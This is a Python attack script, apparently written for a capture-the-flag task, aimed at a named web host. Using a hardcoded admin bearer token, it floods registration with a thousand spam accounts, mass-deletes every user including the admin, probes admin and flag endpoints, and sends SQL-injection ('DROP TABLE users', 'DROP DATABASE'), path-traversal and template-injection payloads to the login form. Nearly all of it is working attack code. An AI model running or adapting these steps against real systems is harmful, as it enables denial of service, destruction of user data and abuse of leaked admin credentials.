#!/usr/bin/env python3
"""
CTF Challenge: Crash the web to get flag
Target: fresh-start-267.emergent.host

Different attack vectors to crash/break the application
"""

import requests
import json
from concurrent.futures import ThreadPoolExecutor
import time

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

print("="*70)
print("CTF: CRASH THE WEB FOR FLAG")
print("="*70)

# Attack 1: Resource Exhaustion - Create massive amounts of data
print("\n[1] Resource Exhaustion Attack - Creating massive data...")
def create_spam_user(i):
    try:
        data = {
            "email": f"spam{i}@crash.test",
            "password": "password123",
            "name": f"Spam User {i}",
            "role": "tasker"
        }
        resp = requests.post(f"{base_url}/api/auth/register", json=data, timeout=5)
        return resp.status_code
    except:
        return None

# Create 1000 users rapidly
with ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(create_spam_user, range(1000)))
    print(f"Created users: {results.count(200)} successful")

# Attack 2: Recursive deletion - Delete everything including admin
print("\n[2] Deleting ALL users including admin...")
try:
    resp = requests.get(f"{base_url}/api/users", headers=headers, timeout=10)
    if resp.status_code == 200:
        users = resp.json()
        print(f"Found {len(users)} users to delete")
        
        def delete_all(user):
            user_id = user.get('id') or user.get('user_id')
            if user_id:
                try:
                    r = requests.delete(f"{base_url}/api/users/{user_id}", headers=headers, timeout=3)
                    return r.status_code
                except:
                    return None
            return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = list(executor.map(delete_all, users))
            print(f"Deleted: {results.count(200)} users")
except Exception as e:
    print(f"Error: {e}")

# Attack 3: Check if site is down / flag appears
print("\n[3] Checking if site crashed...")
try:
    resp = requests.get(base_url, timeout=5)
    print(f"Site status: {resp.status_code}")
    if "flag" in resp.text.lower() or "ctf" in resp.text.lower():
        print("\n" + "="*70)
        print("FLAG FOUND IN RESPONSE!")
        print("="*70)
        print(resp.text)
except Exception as e:
    print(f"Site appears down: {e}")
    print("Checking for flag in error...")

# Attack 4: Try to access admin panel after deletion
print("\n[4] Checking admin endpoints...")
admin_endpoints = [
    '/api/admin',
    '/api/admin/flag',
    '/api/flag',
    '/admin',
    '/flag',
    '/api/admin/database',
    '/api/system/flag',
    '/api/crash',
    '/api/admin/crash'
]

for endpoint in admin_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        print(f"{endpoint}: {resp.status_code}")
        if resp.status_code == 200:
            print(f"Response: {resp.text[:200]}")
            if "flag" in resp.text.lower():
                print("\n" + "="*70)
                print(f"FLAG FOUND AT {endpoint}!")
                print("="*70)
                print(resp.text)
    except Exception as e:
        print(f"{endpoint}: Error - {e}")

# Attack 5: Try to login after deleting admin
print("\n[5] Attempting login after admin deletion...")
try:
    resp = requests.post(
        f"{base_url}/api/auth/login",
        json={"email": "admin@ethara.ai", "password": "admin123"},
        timeout=5
    )
    print(f"Login status: {resp.status_code}")
    print(f"Response: {resp.text}")
    
    if "flag" in resp.text.lower():
        print("\n" + "="*70)
        print("FLAG FOUND IN LOGIN RESPONSE!")
        print("="*70)
        print(resp.text)
except Exception as e:
    print(f"Login error: {e}")

# Attack 6: Check if database is truly empty
print("\n[6] Verifying database state...")
try:
    resp = requests.get(f"{base_url}/api/users", headers=headers, timeout=10)
    print(f"Users endpoint: {resp.status_code}")
    if resp.status_code == 200:
        users = resp.json()
        print(f"Remaining users: {len(users)}")
        if len(users) == 0:
            print("DATABASE IS EMPTY!")
            print("Checking for flag...")
            
            # Try accessing various endpoints when DB is empty
            for endpoint in ['/api/flag', '/flag', '/api/admin/flag', '/']:
                try:
                    r = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
                    if "flag" in r.text.lower() or "ctf" in r.text.lower():
                        print(f"\nFLAG FOUND AT {endpoint}:")
                        print(r.text)
                except:
                    pass
    elif resp.status_code == 500:
        print("SERVER ERROR - Database might be crashed!")
        print(f"Response: {resp.text}")
except Exception as e:
    print(f"Error checking users: {e}")

# Attack 7: Payload injection attempts
print("\n[7] Trying payload injections...")
payloads = [
    {"email": "'; DROP TABLE users; --", "password": "test"},
    {"email": "admin@ethara.ai", "password": "'; DROP DATABASE; --"},
    {"email": "../../../flag", "password": "test"},
    {"email": "{{7*7}}", "password": "test"},  # SSTI
]

for payload in payloads:
    try:
        resp = requests.post(f"{base_url}/api/auth/login", json=payload, timeout=5)
        if "flag" in resp.text.lower() or resp.status_code == 500:
            print(f"\nInteresting response for payload {payload}:")
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text[:500]}")
    except Exception as e:
        print(f"Payload {payload}: {e}")

print("\n" + "="*70)
print("CRASH ATTEMPTS COMPLETE")
print("="*70)
